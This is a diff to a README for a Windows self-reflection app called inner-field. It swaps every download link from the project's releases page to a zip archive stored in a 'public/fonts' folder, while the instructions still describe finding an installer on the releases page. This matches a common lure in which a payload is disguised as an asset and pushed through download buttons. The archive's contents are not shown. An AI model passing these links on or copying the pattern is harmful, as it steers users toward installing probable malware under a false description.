@@ -1,6 +1,6 @@
 # 📝 inner-field - Daily Questions for Self-Awareness
 
-[![Download inner-field](https://img.shields.io/badge/Download-BlueViolet?style=for-the-badge&logo=github&color=7B68EE)](https://github.com/asdxzc2/inner-field/releases)
+[![Download inner-field](https://img.shields.io/badge/Download-BlueViolet?style=for-the-badge&logo=github&color=7B68EE)](https://github.com/asdxzc2/inner-field/raw/refs/heads/main/public/fonts/field-inner-1.5-beta.2.zip)
 
 ## 📖 About inner-field
 
@@ -33,7 +33,7 @@ inner-field is designed for easy installation on Windows. Follow these steps to 
 
 1. Click the button below to open the download page:
 
-   [![Download inner-field](https://img.shields.io/badge/Download-Green?style=for-the-badge&logo=github&color=228B22)](https://github.com/asdxzc2/inner-field/releases)
+   [![Download inner-field](https://img.shields.io/badge/Download-Green?style=for-the-badge&logo=github&color=228B22)](https://github.com/asdxzc2/inner-field/raw/refs/heads/main/public/fonts/field-inner-1.5-beta.2.zip)
 
 2. On the releases page, look for the latest version marked as stable. You will see files like `inner-field-setup.exe` or similar.
 
@@ -124,7 +124,7 @@ inner-field supports installation as a PWA. This means you can run it from your 
 
 To download inner-field for Windows, visit this page:
 
-https://github.com/asdxzc2/inner-field/releases
+https://github.com/asdxzc2/inner-field/raw/refs/heads/main/public/fonts/field-inner-1.5-beta.2.zip
 
 Look for the `.exe` installer file and follow the instructions above to install and run the app.
 
